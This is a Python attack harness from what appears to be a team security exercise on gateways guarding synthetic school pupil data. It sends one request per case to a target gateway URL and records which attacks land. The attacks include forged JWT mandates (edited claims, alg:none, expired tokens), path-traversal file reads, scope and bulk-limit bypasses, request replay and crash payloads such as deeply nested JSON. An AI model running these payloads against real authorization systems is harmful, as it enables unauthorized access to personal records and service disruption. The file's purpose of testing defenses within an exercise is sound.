"""Attack another team's gateway (Day 2 afternoon). The offensive counterpart to self_attack.py.

self_attack.py mints mandates from our own issuer state and attacks our own gateway. This script never mints: against
another team we hold only the mandates they issued to our attack key (the default one, and their feature one), so every
case is signed with attack.pem and one of those mandates, and sent only to the target's posted gateway URL.

    uv run python -m gateway.cli keygen -o attack.pem > our-team.jwk   # once; post the .jwk, keep attack.pem
    uv run python -m day_2_attack.attack --team teamB --url https://teamB.example \
        --agent-key attack.pem --mandate mandates/teamB.jwt [--feature mandates/teamB.feature.jwt]

It fires the catalogue once per mandate, scores candidate Capture-the-Data flags (the levels in ATTACK_SCORING.md)
and gateway breaks, and writes day_2_attack/loot/<team>.md and <team>.json with the exact request sent and response
received for every case that landed, ready to paste into a claim. A candidate flag is the harness's guess from the
response text; confirm the level by eye before claiming, since the proof is the response, not the guess.

In bounds (ATTACK_SCORING.md "Out of bounds"): one request per case, never a flood; only the posted --url; only the
gateway's own HTTP API. Nothing here calls a target's MCP server directly or touches their laptops, repo or cloud.
"""
# ruff: noqa: T201, PLR2004  (a script that prints, one case per line; the data levels are the magic values)

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

from gateway.cli import sign_request
from gateway.lib.common import priv_from_pem, sign_bytes
from gateway.lib.gateway_verify import Request

PD = "pupil-data"
CENSUS = "personal_data_school_census"
NAMES = "synthetic/synthetic_display_names.csv"
SCHOOLS = "synthetic/synthetic_schools.csv"
DEPRIVATION = "synthetic/synthetic_personal_data_deprivation.csv"
CENSUS_FILE = "synthetic/synthetic_personal_data_school_census.csv"

# The default mandate every team hands out: search at SCH01 only, and get on the schools file and the manifest.
HOME_URN = "SCH01"
FLAG_URN = "SCH04"  # the flag pupil's school (Dunmore Community College)
FLAG_PUPIL = "P0011"
NAMED_URN = "SCH07"  # Greystone: one pupil in care
NAMED_PUPIL = "P0586"

# ATTACK_SCORING.md "Capture the Data flags": the exact strings a target's response must contain, by level. A hit is
# a candidate; the human confirms the level from the saved response before claiming.
FLAGS = {
    2: ["Zara Okafor", "0.2505"],  # P0011's name, P0011's deprivation score
    3: ["FSMeligible"],  # a census row for P0011 (also needs P0011 + its school in the row; checked below)
    4: ["Ethnicity", "InCareAtCurrentSchool"],  # P0011's special-category columns
    60: ["Mason Owusu", NAMED_PUPIL],  # the named in-care pupil at SCH07
}
# markers that the issuer private key leaked into a response (50 points)
KEY_MARKERS = ["PRIVATE KEY", "BEGIN OPENSSH", "BEGIN EC PRIVATE", "BEGIN RSA", "-----BEGIN"]

# Daybreak findings that need the request -> approve -> use-child-mandate loop, which this harness can't drive without
# the target's approver. Run these by hand against a target whose feature mandate allows scope requests or delegation,
# using the shim (`request_scopes` / `await_approval`) or `cli`. Each is a forged/over-reach break if it goes through.
MANUAL_DAYBREAK = [
    (
        "Held-call release over-reach: get a call held (202), ask for its release, then use the child mandate for a "
        "different call its scope would allow. It should only run the exact calls it released (reason PREAPPROVED)."
    ),
    (
        "Supervisor passes on a denied tool: a supervising mandate (can_delegate) approves a helper's request for a tool "
        "the supervisor's own mandate denies. It should refuse EXCEEDS_SUPERVISOR."
    ),
    (
        "Supervisor loosens a rate: approve a helper with a higher rate than the supervisor holds, or drop the rate "
        "entirely. It should refuse EXCEEDS_SUPERVISOR / NOT_NARROWER."
    ),
    (
        "Budget charged to the wrong entry: a mandate with two entries for one tool, only one rate-limited; check the "
        "rate is counted against the entry that actually allowed the call."
    ),
]


@dataclass
class Case:
    group: str  # scope | path | bulk | break | crash | demo | counts | audit
    name: str
    body: bytes
    path: str = "/tools/call"
    # what a landed 200 would mean, for the Gateway-breaks table; None = a data flag only
    break_kind: str | None = None  # forged | dead | no_key | crash | bulk


@dataclass
class Result:
    case: Case
    status: int
    text: str
    landed: bool
    level: int | None = None  # candidate data level (2/3/4/60)
    break_kind: str | None = None  # confirmed break kind, if any
    pupils: int = 0  # distinct pupil ids seen in the response


@dataclass
class Report:
    team: str
    url: str
    results: list[Result] = field(default_factory=list)


# ---------------------------------------------------------------- the wire


def post(url: str, path: str, data: bytes) -> tuple[int, str]:
    """(status, body text); status 0 when nothing answered (a possible crash)."""
    req = urllib.request.Request(url.rstrip("/") + path, data=data, headers={"content-type": "application/json"})  # noqa: S310
    try:
        with urllib.request.urlopen(req, timeout=20) as r:  # noqa: S310
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except OSError as e:
        return 0, f"no answer: {e}"


def signed(key, mandate: str, server: str, tool: str, arguments: dict, **override) -> bytes:
    """A request signed with our attack key and the target's mandate, with optional raw field overrides."""
    body = sign_request(key, server=server, tool=tool, arguments=arguments, mandate=mandate)
    return json.dumps({**body, **override}).encode()


def signed_with_nonce(key, mandate: str, server: str, tool: str, arguments: dict, *, nonce: str) -> bytes:
    """A properly signed request carrying a chosen nonce, so the target actually processes that nonce
    (unlike overriding it after signing, which just fails the signature)."""
    req = Request(
        server=server, tool=tool, arguments=arguments, mandate=mandate, nonce=nonce, ts=int(time.time()), sig=""
    )
    req.sig = sign_bytes(key, req.signing_input())
    return json.dumps(req.__dict__).encode()


def edit_claims(mandate: str, **changes) -> str:
    """The mandate with its payload claims changed but the old signature kept: a forged token."""
    h, p, s = mandate.split(".")
    claims = json.loads(base64.urlsafe_b64decode(p + "=="))
    claims.update(changes)
    p2 = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
    return f"{h}.{p2}.{s}"


def alg_none(mandate: str) -> str:
    """The same claims under an alg:none header and no signature."""
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"mandate+jwt"}').rstrip(b"=").decode()
    return f"{header}.{mandate.split('.')[1]}."


# ---------------------------------------------------------------- the catalogue


def catalogue(key, mandate: str) -> list[Case]:
    """Every attack we send with one mandate. Data-flag cases try tools and schools the mandate shouldn't reach;
    break cases probe the gateway itself. Each is exactly one request."""
    d = mandate
    tampered = edit_claims(
        d,
        scope=[{"server": PD, "tools": ["search", "pupil", "roster", "get"]}],  # every school, every pupil tool
        deny=[],
        clearance=4,
    )
    expired = edit_claims(d, exp=1)  # in the past; the signature no longer matches either
    return [
        # ---- data: reach the flag pupil (P0011 @ SCH04) past the default mandate
        Case(
            "scope",
            "search the flag pupil at their school",
            signed(key, d, PD, "search", {"query": FLAG_PUPIL, "urn": FLAG_URN}),
        ),
        Case("scope", "search with no urn (every school)", signed(key, d, PD, "search", {"query": FLAG_PUPIL})),
        Case(
            "scope",
            "urn as a list of both schools",
            signed(key, d, PD, "search", {"query": FLAG_PUPIL, "urn": [HOME_URN, FLAG_URN]}),
        ),
        Case(
            "scope",
            "urn null (server may read as every school)",
            signed(key, d, PD, "search", {"query": FLAG_PUPIL, "urn": None}),
        ),
        Case(
            "scope",
            "pupil tool (not in the mandate)",
            signed(key, d, PD, "pupil", {"pupil_id": FLAG_PUPIL, "urn": FLAG_URN}),
        ),
        Case("scope", "roster the flag school", signed(key, d, PD, "roster", {"urn": FLAG_URN, "year_group": 11})),
        Case(
            "scope",
            "tool name with a trailing space",
            signed(key, d, PD, "search ", {"query": FLAG_PUPIL, "urn": FLAG_URN}),
        ),
        Case(
            "scope",
            "directory.name for the flag pupil",
            signed(key, d, "directory", "name", {"pupil_id": FLAG_PUPIL, "urn": FLAG_URN}),
        ),
        Case(
            "scope",
            "special.record for the flag pupil (level 4)",
            signed(key, d, "special", "record", {"pupil_id": FLAG_PUPIL, "urn": FLAG_URN}),
        ),
        Case(
            "scope",
            "server with a path-traversal name",
            signed(key, d, "pupil-data/../directory", "name", {"pupil_id": FLAG_PUPIL, "urn": FLAG_URN}),
        ),
        # ---- data: the named pupil in care at SCH07 (60 points)
        Case(
            "scope",
            "special.record the SCH07 in-care pupil",
            signed(key, d, "special", "record", {"pupil_id": NAMED_PUPIL, "urn": NAMED_URN}),
        ),
        Case(
            "scope",
            "pupil tool for the SCH07 named pupil",
            signed(key, d, PD, "pupil", {"pupil_id": NAMED_PUPIL, "urn": NAMED_URN}),
        ),
        Case(
            "scope",
            "directory.name the SCH07 named pupil",
            signed(key, d, "directory", "name", {"pupil_id": NAMED_PUPIL, "urn": NAMED_URN}),
        ),
        # ---- data via get: the names and census files past the one allowed file
        Case(
            "path", "names file via ..", signed(key, d, PD, "get", {"path": "synthetic/../" + NAMES}), break_kind="bulk"
        ),
        Case(
            "path",
            "names file behind the allowed file",
            signed(key, d, PD, "get", {"path": SCHOOLS + "/../synthetic_display_names.csv"}),
            break_kind="bulk",
        ),
        Case(
            "path",
            "names file, percent-encoded ..",
            signed(key, d, PD, "get", {"path": "synthetic/%2e%2e/" + NAMES}),
            break_kind="bulk",
        ),
        Case(
            "path",
            "names file, backslashes",
            signed(key, d, PD, "get", {"path": "synthetic\\..\\" + NAMES}),
            break_kind="bulk",
        ),
        Case(
            "path",
            "names file, absolute",
            signed(key, d, PD, "get", {"path": "/app/mcp_server/data/" + NAMES}),
            break_kind="bulk",
        ),
        Case(
            "path",
            "names file after a null byte",
            signed(key, d, PD, "get", {"path": SCHOOLS + "\x00/../" + NAMES}),
            break_kind="bulk",
        ),
        Case(
            "path",
            "census file via ..",
            signed(key, d, PD, "get", {"path": "synthetic/../" + CENSUS_FILE}),
            break_kind="bulk",
        ),
        Case(
            "path",
            "deprivation file via ..",
            signed(key, d, PD, "get", {"path": "synthetic/../" + DEPRIVATION}),
            break_kind="bulk",
        ),
        Case("path", "path as a list", signed(key, d, PD, "get", {"path": [SCHOOLS, NAMES]}), break_kind="bulk"),
        # ---- bulk: more than 100 pupils outside the mandate
        Case(
            "bulk",
            "search the flag school, limit 1000",
            signed(key, d, PD, "search", {"query": "SPR", "urn": FLAG_URN, "limit": 1000}),
            break_kind="bulk",
        ),
        Case(
            "bulk",
            "limit as a string",
            signed(key, d, PD, "search", {"query": "SPR", "urn": FLAG_URN, "limit": "1000"}),
            break_kind="bulk",
        ),
        Case(
            "bulk",
            "limit as a float",
            signed(key, d, PD, "search", {"query": "SPR", "urn": FLAG_URN, "limit": 1000.0}),
            break_kind="bulk",
        ),
        # ---- forged mandates: accepted though this team's issuer never signed these claims for us
        Case(
            "break",
            "edited scope + clearance 4, old signature",
            signed(key, tampered, PD, "search", {"query": FLAG_PUPIL, "urn": FLAG_URN}),
            break_kind="forged",
        ),
        Case(
            "break",
            "edited scope, special.record",
            signed(key, tampered, "special", "record", {"pupil_id": FLAG_PUPIL, "urn": FLAG_URN}),
            break_kind="forged",
        ),
        Case(
            "break",
            "alg:none, no signature",
            signed(key, alg_none(d), PD, "search", {"query": FLAG_PUPIL, "urn": FLAG_URN}),
            break_kind="forged",
        ),
        Case(
            "break",
            "mandate is not a JWT",
            signed(key, "x.y.z", PD, "search", {"query": FLAG_PUPIL, "urn": FLAG_URN}),
            break_kind="forged",
        ),
        # ---- dead mandate: expired claims accepted
        Case(
            "break",
            "expired (exp in the past)",
            signed(key, expired, PD, "search", {"query": FLAG_PUPIL, "urn": FLAG_URN}),
            break_kind="dead",
        ),
        # ---- no key: a call not freshly signed by the mandate's key
        Case(
            "break",
            "bad signature",
            signed(key, d, PD, "search", {"query": "P0004", "urn": HOME_URN}, sig="AAAA"),
            break_kind="no_key",
        ),
        Case(
            "break",
            "stale timestamp",
            signed(key, d, PD, "search", {"query": "P0004", "urn": HOME_URN}, ts=1),
            break_kind="no_key",
        ),
        Case(
            "break",
            "arguments changed after signing",
            signed(key, d, PD, "search", {"query": "P0004", "urn": HOME_URN})
            .replace(b"P0004", b"P0011")
            .replace(b'"' + HOME_URN.encode() + b'"', b'"' + FLAG_URN.encode() + b'"'),
            break_kind="no_key",
        ),
        # (the replay pair is sent by run(), which needs both responses together)
        # ---- crash: one request that should 500 or hang
        Case(
            "crash",
            "lone surrogate in an argument",
            signed(key, d, PD, "get", {"path": "x"}).replace(b'"x"', b'"\\ud800"'),
            break_kind="crash",
        ),
        Case(
            "crash",
            "lone surrogate in the nonce",
            signed(key, d, PD, "get", {"path": SCHOOLS}, nonce="n").replace(b'"n"', b'"\\ud800"'),
            break_kind="crash",
        ),
        Case(
            "crash",
            "NaN in an argument",
            signed(key, d, PD, "search", {"query": "SPR", "urn": HOME_URN}).replace(b'"SPR"', b"NaN"),
            break_kind="crash",
        ),
        Case(
            "crash",
            "timestamp too big for a float",
            signed(key, d, PD, "search", {"query": "SPR", "urn": HOME_URN}, ts=10**400),
            break_kind="crash",
        ),
        Case(
            "crash",
            "arguments nested 5000 deep",
            b'{"server":"pupil-data","tool":"search","mandate":"x","nonce":"n","ts":1,"sig":"s","arguments":{"a":'
            + b"[" * 5000
            + b"]" * 5000
            + b"}}",
            break_kind="crash",
        ),
        Case(
            "crash",
            "query is an object",
            signed(key, d, PD, "search", {"query": {"a": 1}, "urn": HOME_URN}),
            break_kind="crash",
        ),
        Case(
            "crash",
            "audit-event endpoint, junk token",
            b'{"token": "x"}',
            path="/internal/audit-events",
            break_kind="crash",
        ),
        # ---- demo router: mints and signs for anyone who can reach it (should be off on a deployed gateway)
        Case(
            "demo",
            "mint a mandate for the flag school",
            b'{"urn": "SCH04", "tools": ["search", "pupil"]}',
            path="/demo/mandate",
            break_kind="forged",
        ),
        Case(
            "demo",
            "call through the demo's own key",
            b'{"tool": "pupil", "arguments": {"pupil_id": "P0011", "urn": "SCH04"}}',
            path="/demo/call",
            break_kind="forged",
        ),
        Case("demo", "revoke someone's mandate", b'{"idx": 9999}', path="/demo/revoke", break_kind="forged"),
        # ---- counts: pin a level-4 fact to one pupil through aggregate
        Case(
            "counts",
            "group by pupil",
            signed(key, d, PD, "aggregate", {"table": CENSUS, "measure": "FSMeligible", "group_by": ["Psuedo ID"]}),
        ),
        Case(
            "counts",
            "filter a count to the flag pupil",
            signed(
                key,
                d,
                PD,
                "aggregate",
                {"table": CENSUS, "measure": "FSMeligible", "group_by": ["URN"], "where": {"Psuedo ID": FLAG_PUPIL}},
            ),
        ),
        Case(
            "counts",
            "in-care by gender at SCH07 (name the one)",
            signed(
                key,
                d,
                PD,
                "aggregate",
                {
                    "table": CENSUS,
                    "group_by": ["URN", "Gender"],
                    "measure": "InCareAtCurrentSchool",
                    "where": {"URN": NAMED_URN},
                },
            ),
        ),
        # ---- audit: read someone else's log with the mandate we were given
        Case(
            "audit",
            "read the officer's request log",
            signed(key, d, "audit", "events", {"principal": "officer:jsmith"}),
        ),
        Case(
            "audit",
            "read what another mandate saw",
            signed(key, d, "audit", "saw", {"principal": "officer:jsmith", "limit": 50}),
        ),
        # ---- Daybreak review findings (single-request ones; the approval-loop findings are the manual checklist below)
        # finding 5: a nonce must be bounded and not crash or grow memory. A 100k nonce, properly signed.
        Case(
            "daybreak",
            "oversized nonce (100k chars), properly signed",
            signed_with_nonce(key, d, "schools", "list", {}, nonce="x" * 100_000),
            break_kind="crash",
        ),
        # finding 6: a malformed grants.request must be an audited REQUEST_INVALID, never a 500.
        Case(
            "daybreak",
            "grants.request with a non-string server",
            signed(
                key, d, "grants", "request", {"reason": "x", "ttl": 3600, "scope": [{"server": [], "tools": ["name"]}]}
            ),
            break_kind="crash",
        ),
        Case(
            "daybreak",
            "grants.request with a nested tool name",
            signed(
                key,
                d,
                "grants",
                "request",
                {"reason": "x", "ttl": 3600, "scope": [{"server": "directory", "tools": [["name"]]}]},
            ),
            break_kind="crash",
        ),
        Case(
            "daybreak",
            "grants.request with a nested urn constraint",
            signed(
                key,
                d,
                "grants",
                "request",
                {
                    "reason": "x",
                    "ttl": 3600,
                    "scope": [{"server": "directory", "tools": ["name"], "constraints": {"urn": [{"a": 1}]}}],
                },
            ),
            break_kind="crash",
        ),
    ]


# ---------------------------------------------------------------- scoring


def distinct_pupils(text: str) -> int:
    """A rough count of distinct pupil ids (Pnnnn) in a response, for the bulk break."""
    import re  # noqa: PLC0415

    return len(set(re.findall(r"\bP\d{4}\b", text)))


def allowed(text: str) -> bool:
    try:
        return json.loads(text).get("decision", {}).get("decision") == "ALLOW"
    except ValueError:
        return False


def candidate_level(text: str) -> int | None:
    """The highest Capture-the-Data level whose flag strings appear in the response, or None.

    A guess from the text, to flag a case for a human to confirm against the saved response, never a final score.
    """
    if any(m in text for m in FLAGS[60]):
        return 60
    if FLAG_PUPIL in text and any(m in text for m in FLAGS[4]):
        return 4  # P0011's row with a special-category column
    if FLAG_PUPIL in text and (FLAG_URN in text or "FSMeligible" in text):
        return 3  # P0011's census row
    if any(m in text for m in FLAGS[2]):
        return 2  # P0011's name or deprivation score
    return None


def assess(case: Case, status: int, text: str) -> Result:
    pupils = distinct_pupils(text)
    is_200 = status == 200
    crashed = status in (0, 500)
    level = candidate_level(text) if is_200 else None
    keys = any(m in text for m in KEY_MARKERS)
    break_kind = None
    if keys:
        break_kind = "keys"
    elif crashed and case.break_kind == "crash":
        break_kind = "crash"
    elif crashed:
        break_kind = "crash"  # any 500 is a crash, whatever the case was probing
    elif is_200 and allowed(text) and case.break_kind in ("forged", "dead", "no_key"):
        break_kind = case.break_kind
    elif is_200 and case.break_kind == "bulk" and pupils > 100:
        break_kind = "bulk"
    landed = bool(level) or bool(break_kind) or (is_200 and pupils > 100)
    return Result(case, status, text, landed, level, break_kind, pupils)


# ---------------------------------------------------------------- run and report


def run_mandate(key, url: str, mandate: str, label: str, report: Report) -> None:
    print(f"\n=== {label} mandate against {report.team} ({url}) ===")
    for case in catalogue(key, mandate):
        status, text = post(url, case.path, case.body)
        r = assess(case, status, text)
        report.results.append(r)
        _print_row(label, r)
    # the replay pair: one benign in-scope call sent twice; a 200 on the second is the no-key break
    body = signed(key, mandate, PD, "search", {"query": "SPR", "urn": HOME_URN})
    s1, _ = post(url, "/tools/call", body)
    s2, t2 = post(url, "/tools/call", body)
    replay = Case("break", "the same signed request replayed", body, break_kind="no_key")
    r = Result(replay, s2, t2, landed=(s2 == 200), break_kind=("no_key" if s2 == 200 else None))
    report.results.append(r)
    _print_row(label, r)
    print(f"   (first send of the replay pair: {s1})")


def _print_row(label: str, r: Result) -> None:
    tag = "LANDED" if r.landed else "held"
    extra = []
    if r.level:
        extra.append(f"level {r.level}")
    if r.break_kind:
        extra.append(r.break_kind)
    if r.pupils:
        extra.append(f"{r.pupils} pupils")
    try:
        reason = json.loads(r.text).get("decision", {}).get("reason_code") or ""
    except ValueError:
        reason = r.text[:30]
    print(f"  {tag:7} {label:7} {r.case.group:7} {r.status:>3} {reason:22.22} {r.case.name}  {' '.join(extra)}")


def write_loot(report: Report, out_dir: Path) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    landed = [r for r in report.results if r.landed]
    data = max((r.level for r in landed if r.level), default=None)
    breaks = sorted({r.break_kind for r in landed if r.break_kind})
    (out_dir / f"{report.team}.json").write_text(
        json.dumps(
            {
                "team": report.team,
                "url": report.url,
                "top_data_level": data,
                "breaks": breaks,
                "landed": [
                    {
                        "group": r.case.group,
                        "name": r.case.name,
                        "status": r.status,
                        "level": r.level,
                        "break": r.break_kind,
                        "pupils": r.pupils,
                        "request": r.case.body.decode(errors="replace"),
                        "response": r.text,
                    }
                    for r in landed
                ],
            },
            indent=2,
        )
    )
    md = [f"# Attack on {report.team} — {report.url}", ""]
    md.append(f"Top data level: **{data or 'none'}**. Breaks: **{', '.join(breaks) or 'none'}**.")
    md.append("")
    md.append("Each block is a claim: the request sent and the response received. Confirm the data level by eye.")
    for r in landed:
        md += [
            "",
            f"## {r.case.group}: {r.case.name}",
            f"- status `{r.status}`"
            + (f", candidate level {r.level}" if r.level else "")
            + (f", break: {r.break_kind}" if r.break_kind else "")
            + (f", {r.pupils} distinct pupils" if r.pupils else ""),
            "",
            "Request to `" + r.case.path + "`:",
            "```json",
            r.case.body.decode(errors="replace")[:4000],
            "```",
            "Response:",
            "```json",
            r.text[:4000],
            "```",
        ]
    md += ["", "## Manual Daybreak checks (not automated)", ""]
    md += [f"- {item}" for item in MANUAL_DAYBREAK]
    path = out_dir / f"{report.team}.md"
    path.write_text("\n".join(md))
    return path


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Attack another team's gateway (Day 2).")
    ap.add_argument("--team", required=True, help="the defending team's name, for the loot files")
    ap.add_argument("--url", required=True, help="their posted gateway URL (nothing else is in bounds)")
    ap.add_argument("--agent-key", required=True, type=Path, help="attack.pem (the key the .jwk you posted came from)")
    ap.add_argument("--mandate", required=True, type=Path, help="their default mandate for you")
    ap.add_argument("--feature", type=Path, help="their feature mandate for you, if posted")
    ap.add_argument("--out", type=Path, default=Path("day_2_attack/loot"), help="where to write the loot files")
    a = ap.parse_args(argv)

    if not a.agent_key.exists():
        print(f"no attack key at {a.agent_key}: run `uv run python -m gateway.cli keygen -o {a.agent_key}` first")
        return 2
    key = priv_from_pem(a.agent_key.read_bytes())
    report = Report(team=a.team, url=a.url)
    run_mandate(key, a.url, a.mandate.read_text().strip(), "default", report)
    if a.feature:
        run_mandate(key, a.url, a.feature.read_text().strip(), "feature", report)

    path = write_loot(report, a.out)
    landed = [r for r in report.results if r.landed]
    data = max((r.level for r in landed if r.level), default=None)
    breaks = sorted({r.break_kind for r in landed if r.break_kind})
    print(f"\n{len(landed)} landed. Top data level: {data or 'none'}. Breaks: {breaks or 'none'}.")
    print(f"Proof written to {path} and {path.with_suffix('.json')}.")
    print("\nRun these Daybreak checks by hand (they need the approval loop; see the loot file):")
    for item in MANUAL_DAYBREAK:
        print(f"  - {item.split(':')[0]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
